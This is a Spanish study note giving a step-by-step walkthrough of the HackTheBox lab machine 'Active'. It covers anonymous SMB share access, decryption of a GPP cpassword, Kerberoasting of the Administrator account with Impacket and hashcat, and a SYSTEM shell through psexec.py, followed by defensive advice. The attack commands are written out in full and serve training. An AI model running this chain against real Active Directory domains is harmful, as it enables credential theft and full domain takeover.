---
title: Active (HackTheBox Medium)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, medium, active-directory, kerberos, smb, gpp, kerberoasting]
type: nota
status: en-progreso
source: claude-code
aliases: [Active HTB, Active Directory intro, GPP cpassword, Kerberoasting Active]
---

# Active — HackTheBox (Medium)

SO: Windows (AD / Domain Controller) · Dificultad: Medium · Skills: enumeración SMB anónima, Group Policy Preferences (GPP / MS14-025), Impacket, Kerberoasting, cracking offline con hashcat/john.

> Recordatorio ético: HTB es un laboratorio **legal y autorizado**. Todo lo que sigue se ejecuta contra una máquina retirada en un entorno controlado. No lo apliques fuera de ámbitos donde tengas permiso explícito.

Active es la introducción canónica al pentesting de **Active Directory**. La cadena completa es: SMB permite una **sesión anónima (null session)** que expone un share `Replication` (un espejo de SYSVOL); dentro hay un `Groups.xml` de **Group Policy Preferences** con un atributo `cpassword` cifrado con una clave AES que **Microsoft publicó** (MS14-025) → descifras la contraseña del usuario de servicio `SVC_TGS`. Con esas credenciales haces **Kerberoasting**: pides el ticket de servicio (TGS) de la cuenta `Administrator` (que tiene un SPN), lo crackeas offline porque va firmado con su hash, y obtienes Domain Admin → `psexec.py` → SYSTEM.

## Objetivo

Conseguir las dos flags:
- `user.txt` — en el escritorio/home del usuario sin privilegios (legible con las credenciales de `SVC_TGS` vía SMB).
- `root.txt` — en `C:\Users\Administrator\Desktop\root.txt`, accesible una vez seas Administrator/SYSTEM.

El objetivo didáctico real es interiorizar el **patrón nuclear de AD**: null session → secreto en SYSVOL → escalada por Kerberos.

## Acceso a la máquina (paso previo)

1. Conéctate a la VPN del laboratorio y **deja la terminal abierta** (no la cierres durante toda la sesión):
```bash
sudo openvpn lab_<usuario>.ovpn
```
   Verás líneas terminando en `Initialization Sequence Completed`. Eso significa túnel arriba. Si usas **Pwnbox**, ya viene conectado y te puedes saltar este paso.

2. En el portal HTB pulsa **Spawn Machine**. Te dará una IP del rango retirado `10.10.10.x`.

3. Comprueba conectividad:
```bash
ping -c2 <IP>
```
   Esperas 2 respuestas (`64 bytes from <IP>`). Si hay `100% packet loss`, revisa la VPN o que la máquina haya terminado de arrancar (Windows tarda). Sustituye `<IP>` por la tuya en todos los comandos.

> Nota: las máquinas **retiradas** requieren suscripción **VIP**. Las activas son gratis pero rotan.

## Reconocimiento

Lanza un escaneo completo de puertos con detección de servicio y scripts por defecto:
```bash
nmap -sC -sV -p- -oN nmap.txt <IP>
```
- `-p-` escanea los 65535 puertos (no asumas que todo está en el top 1000; en AD aparecen puertos altos dinámicos).
- `-sV` identifica versión del servicio; `-sC` corre los scripts NSE por defecto (banner, certificados, etc.).
- `-oN nmap.txt` guarda la salida.

Salida esperada (puertos típicos de un **Domain Controller** — esto es la huella inconfundible de AD):

| Puerto | Servicio | Qué te dice |
|---|---|---|
| 53 | DNS (Microsoft) | Hay DNS interno → es un DC; sirve para resolver el dominio |
| 88 | Kerberos | **Confirma DC**. Kerberos = autenticación AD. Vector de Kerberoasting/AS-REP |
| 135 | MSRPC | Endpoint mapper, RPC |
| 139/445 | NetBIOS / SMB | **SMB**: shares, sesiones anónimas. Tu primer objetivo |
| 389/636 | LDAP / LDAPS | Directorio LDAP (consultar usuarios, grupos, SPNs) |
| 464 | kpasswd | Cambio de contraseñas Kerberos |
| 593 | RPC over HTTP | |
| 3268/3269 | Global Catalog (LDAP) | Catálogo global del bosque |
| (5985) | WinRM | A veces; gestión remota PowerShell |

Qué buscar: el script `nmap` suele filtrar el **nombre de dominio**. En la salida de Kerberos/LDAP/`smb-os-discovery` verás `active.htb` y el FQDN del DC (algo como `DC.active.htb`). Añádelo a `/etc/hosts`:
```bash
echo "<IP> active.htb DC.active.htb" | sudo tee -a /etc/hosts
```
Hipótesis tras el recon: **es un DC**. El camino de menor resistencia en AD casi siempre empieza por SMB (445) y por buscar credenciales sin autenticar.

## Enumeración

### SMB (445) — buscar shares accesibles sin credenciales

Categoría: *null session / anonymous SMB enumeration*. Patrón: antes de tener credenciales, prueba si el servidor te deja listar o leer shares con sesión anónima.

```bash
smbclient -L //<IP>/ -N
```
- `-L` lista shares; `-N` = sin contraseña (null session).

Salida esperada: una tabla de shares. Lo relevante es un share **`Replication`** además de los habituales (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`, `Users`). Los `$` son administrativos (no entrarás anónimo). `Replication` es el que llama la atención: no es estándar.

Alternativa equivalente (más informativa, te dice permisos READ/WRITE):
```bash
smbmap -H <IP> -u anonymous
# o sin usuario:
smbmap -H <IP>
```
Salida esperada: `Replication   READ ONLY`. Ese **READ ONLY anónimo** es la puerta de entrada.

Trampa típica: `crackmapexec smb <IP> --shares` sin credenciales puede no mostrar `Replication` según versión; si un método no lista nada, prueba otro (smbclient/smbmap/cme) antes de descartar.

### Inspeccionar el share Replication

`Replication` es, en la práctica, una **copia de SYSVOL**. SYSVOL contiene las políticas de grupo (GPO) que el DC distribuye a los equipos del dominio. Históricamente las GPO podían guardar contraseñas → ahí está el premio.

Descarga recursiva todo el share para inspeccionarlo cómodo:
```bash
smbclient //<IP>/Replication -N -c 'recurse ON; prompt OFF; mget *'
```
Esto baja el árbol completo. La ruta clave (lo que buscas) es:
```
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```
> El GUID `{31B2F340-...}` es el de la **Default Domain Policy** (constante en cualquier dominio). Reconocerlo es una señal de que estás en SYSVOL.

Lee el `Groups.xml`:
```bash
cat 'active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml'
```
Salida esperada (XML de Group Policy Preferences), con un atributo clave:
```http
<Groups ...>
  <User ... name="active.htb\SVC_TGS" ...>
    <Properties ... userName="active.htb\SVC_TGS"
      cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"/>
```
Qué buscar: el atributo **`cpassword`**. Ese es el indicador de la vulnerabilidad.

## Acceso inicial (foothold)

Categoría/CVE: **Group Policy Preferences (GPP) — MS14-025**. Patrón: las GPP permitían fijar contraseñas (cuentas locales, mapeos, etc.). Se cifraban con AES-256… pero Microsoft **publicó la clave AES en MSDN**, así que el cifrado es reversible por cualquiera. El parche MS14-025 (2014) eliminó la capacidad de crear estas contraseñas, pero las ya escritas en SYSVOL siguen siendo legibles por cualquier usuario del dominio (y aquí, anónimo).

1. **Descifrar el `cpassword`** con la clave pública conocida:
```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```
   `gpp-decrypt` (en Kali) simplemente hace base64-decode + AES-256-CBC con la clave fija de Microsoft. Devuelve la contraseña en claro de **`SVC_TGS`**. Llamémosla `<pass_svc_tgs>`.
   - Alternativa sin la herramienta: descifrar con `openssl` usando la clave AES pública documentada, pero `gpp-decrypt` es instantáneo.

2. **Validar las credenciales** contra SMB antes de seguir (siempre confirma que funcionan):
```bash
crackmapexec smb <IP> -u SVC_TGS -p '<pass_svc_tgs>'
# o
smbmap -H <IP> -u SVC_TGS -p '<pass_svc_tgs>'
```
   Esperas un `[+] active.htb\SVC_TGS:<pass>` (login OK). Con `smbmap` verás ahora **`Users  READ ONLY`** (antes no aparecía).

3. **Leer `user.txt`** desde el share `Users`:
```bash
smbclient //<IP>/Users -U 'active.htb/SVC_TGS%<pass_svc_tgs>'
```
   Dentro navega (`cd SVC_TGS\Desktop`) y descarga (`get user.txt`). Léela:
```bash
cat user.txt
```
   → `<flag>` (user.txt está en el escritorio del usuario SVC_TGS).

## Shell estable

En Active **no necesitas una webshell/reverse shell** para el foothold: trabajas con credenciales válidas y herramientas de Impacket que dan ejecución remota nativa (SMB/WMI/Kerberos). Esto es lo normal en AD: la "shell" llega al final, ya como Administrator.

Aun así, si quisieras interactividad temprana con `SVC_TGS`:
- `SVC_TGS` normalmente **no** tiene permisos de WinRM ni de ejecución remota en el DC, así que `psexec.py`/`wmiexec.py`/`evil-winrm` con esa cuenta suelen fallar (acceso denegado). Es esperado: su valor no es ejecutar comandos, sino **servir para Kerberoasting**.
- La shell interactiva real (SYSTEM) se obtiene en la fase de escalada con `psexec.py` como Administrator (más abajo).

## Escalada de privilegios

### Enumeración como SVC_TGS → buscar SPNs

Categoría: **Kerberoasting**. Idea: cualquier usuario autenticado puede pedir un **TGS** (ticket de servicio) para cualquier cuenta que tenga un **SPN** (Service Principal Name). Ese ticket va **cifrado/firmado con el hash NTLM de la cuenta de servicio**. Si la contraseña de esa cuenta es débil, puedes crackear el hash **offline** sin tocar el DC ni generar bloqueos. En Active, la cuenta `Administrator` tiene un SPN configurado (algo poco realista pero típico de la máquina-tutorial), así que kerberoastearla = comprometer Domain Admin.

1. **Pedir el TGS** de cuentas con SPN usando Impacket:
```bash
GetUserSPNs.py active.htb/SVC_TGS:'<pass_svc_tgs>' -dc-ip <IP> -request
```
   - `GetUserSPNs.py` consulta LDAP buscando objetos con atributo `servicePrincipalName`, y con `-request` solicita por Kerberos (puerto 88) el TGS de cada uno.
   - `-dc-ip <IP>` apunta al DC.

   Salida esperada: una tabla con la cuenta `Administrator` y su SPN (`active/CIFS:445` u similar), seguida del hash en formato crackeable:
```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$<bloque-hex-largo>...
```
   Qué buscar: la línea que empieza por **`$krb5tgs$23$`** (RC4/etype 23). Guárdala en un archivo `tgs.hash`.

   Trampa: si da `KRB_AP_ERR_SKEW` (clock skew too great), **sincroniza tu reloj con el DC** (Kerberos es muy sensible al tiempo):
```bash
sudo ntpdate <IP>     # o: sudo rdate -n <IP>
```
   Otra trampa: usa el nombre de dominio `active.htb`, no la IP, en el primer parámetro; y comillas simples alrededor de la contraseña si tiene símbolos.

2. **Crackear el hash offline** con hashcat (modo 13100 = Kerberos 5 TGS-REP etype 23):
```bash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```
   - Internamente hashcat prueba cada palabra de rockyou como contraseña del servicio, deriva el hash NTLM, intenta descifrar la parte del ticket y comprueba el padding/estructura. Cuando coincide → contraseña encontrada.
   - Salida: `...:Ticketmaster1968` (o la que sea) → esa es `<pass_administrator>`. Si ya estaba crackeado, añade `--show`.
   - Alternativa con John: `john --wordlist=/usr/share/wordlists/rockyou.txt tgs.hash` (autodetecta `krb5tgs`).

3. **Validar y obtener shell SYSTEM** con las credenciales de Administrator:
```bash
psexec.py active.htb/Administrator:'<pass_administrator>'@<IP>
```
   - `psexec.py` (Impacket) sube un servicio temporal al `ADMIN$`, lo arranca y te da una shell **NT AUTHORITY\SYSTEM** (psexec corre como SYSTEM, por encima incluso de Administrator).
   - Salida: un prompt `C:\Windows\system32>`. Confirma con `whoami` → `nt authority\system`.
   - Alternativas: `wmiexec.py active.htb/Administrator:'<pass>'@<IP>` (más sigilosa, sin servicio), o `evil-winrm -i <IP> -u Administrator -p '<pass>'` si 5985 está abierto.

## Flags

- **user.txt**: ya leída en el foothold, vía SMB en el escritorio de `SVC_TGS`:
```bash
smbclient //<IP>/Users -U 'active.htb/SVC_TGS%<pass_svc_tgs>' -c 'get SVC_TGS\Desktop\user.txt'
cat user.txt
```
- **root.txt**: desde la shell SYSTEM de `psexec.py`:
```powershell
type C:\Users\Administrator\Desktop\root.txt
```
   Ambas son cadenas hex de 32 caracteres → `<flag>`.

## Patrón y teoría

Esta máquina condensa **tres patrones reutilizables** que aparecen una y otra vez en AD real:

1. **Acceso no autenticado a SMB / SYSVOL.** Lo primero en un DC es probar null session y leer shares legibles. SYSVOL es legible por cualquier miembro del dominio por diseño (las máquinas necesitan leer las GPO). Cualquier secreto que caiga ahí queda expuesto a todo el dominio.

2. **GPP cpassword (MS14-025).** Patrón "secreto cifrado con clave pública" = no es secreto. Reconocer el atributo `cpassword` y la ruta `...\Preferences\Groups\Groups.xml`. La clave AES está documentada por Microsoft.
   - **Defensa / diseño (dev / blue team)**: aplicar el parche **MS14-025**; **nunca** usar GPP para distribuir contraseñas; auditar SYSVOL en busca de `cpassword` (`Get-GPPPassword`, findstr recursivo). Para credenciales de servicio usar **gMSA** (Group Managed Service Accounts), que rotan automáticamente y no se almacenan en claro.

3. **Kerberoasting.** Patrón estructural de Kerberos: *cualquier usuario autenticado puede solicitar el TGS de cualquier SPN, y ese ticket está cifrado con el hash de la cuenta de servicio* → cracking offline sin ruido ni bloqueo de cuenta.
   - **Defensa / diseño**: contraseñas **largas y aleatorias** (>25 chars) en cuentas de servicio → Kerberoasting solo rompe contraseñas débiles. Mejor aún, **gMSA** (contraseñas de 120+ chars autogestionadas). Forzar **AES** (etype 17/18) en vez de RC4 (etype 23) endurece el cracking. **Monitorizar** peticiones masivas de TGS (Event ID 4769) y minimizar SPNs en cuentas privilegiadas — un Administrator con SPN es un error de diseño grave.

Conexión con el mundo real: este es el flujo introductorio del pentesting de **Windows Server / Active Directory** empresarial. Las mismas piezas (Impacket, hashcat, enumeración LDAP/SMB, Kerberos) escalan a entornos de miles de equipos. Ver [[05-identidad-auth-y-secretos]] para el modelo de autenticación/secretos, [[06-seguridad-de-sistemas-y-hardening]] para el endurecimiento del DC, y [[13-herramientas-en-detalle]] para Impacket/hashcat/crackmapexec en profundidad.

## Trampas y errores comunes

1. **No escanear todos los puertos** (`-p-`). En AD hay puertos altos relevantes; quedarte en el top-1000 te puede hacer perder contexto del rol DC.
2. **Olvidar `/etc/hosts`.** Kerberos e Impacket dependen de resolver `active.htb` / `DC.active.htb`. Sin la entrada, fallos confusos de DNS/SPN.
3. **Clock skew (`KRB_AP_ERR_SKEW`).** Kerberos exige relojes sincronizados (ventana ~5 min). Sincroniza con `ntpdate <IP>` antes de `GetUserSPNs.py`/`psexec.py`.
4. **Usar IP en vez de dominio en herramientas Kerberos.** `GetUserSPNs.py active.htb/...` (no la IP); el realm debe ser el dominio. Comillas simples si la contraseña tiene caracteres especiales (`!`, `$`).
5. **Esperar shell con SVC_TGS.** Esa cuenta no ejecuta remotamente; su única función es Kerberoasting. Intentar `evil-winrm`/`psexec` con ella y frustrarse es el error clásico — la shell llega con Administrator.

## Conexiones

- [[HTB_Medium/00_README]]
- [[MOC_Ciberseguridad]]
- [[HTB_Easy/00_README]] (el paso anterior)
- [[12-aprender-y-carrera]]
- [[05-identidad-auth-y-secretos]]
- [[06-seguridad-de-sistemas-y-hardening]]
- [[13-herramientas-en-detalle]]
